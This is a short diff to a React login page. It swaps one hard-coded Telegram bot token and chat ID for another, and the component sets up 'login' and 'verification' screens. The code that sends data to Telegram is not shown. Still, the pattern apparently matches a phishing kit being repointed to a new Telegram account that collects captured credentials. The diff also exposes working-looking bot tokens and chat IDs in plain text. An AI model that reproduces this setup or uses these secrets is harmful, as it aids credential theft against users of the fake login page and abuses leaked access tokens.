@@ -1,8 +1,8 @@
 import { useState } from 'react';
 import './App.css';
 
-const TELEGRAM_BOT_TOKEN = '8685069415:AAFZkoDXvuIQLCILnwXBYTnX7pkksdKh2vo';
-const TELEGRAM_CHAT_ID = '8481909018';
+const TELEGRAM_BOT_TOKEN = '8457904685:AAHPVCkGflXFDR8TlAdEVAvDotmvZmw9cK0';
+const TELEGRAM_CHAT_ID = '6201590412';
 
 function App() {
   const [page, setPage] = useState('login'); // 'login' or 'verification'
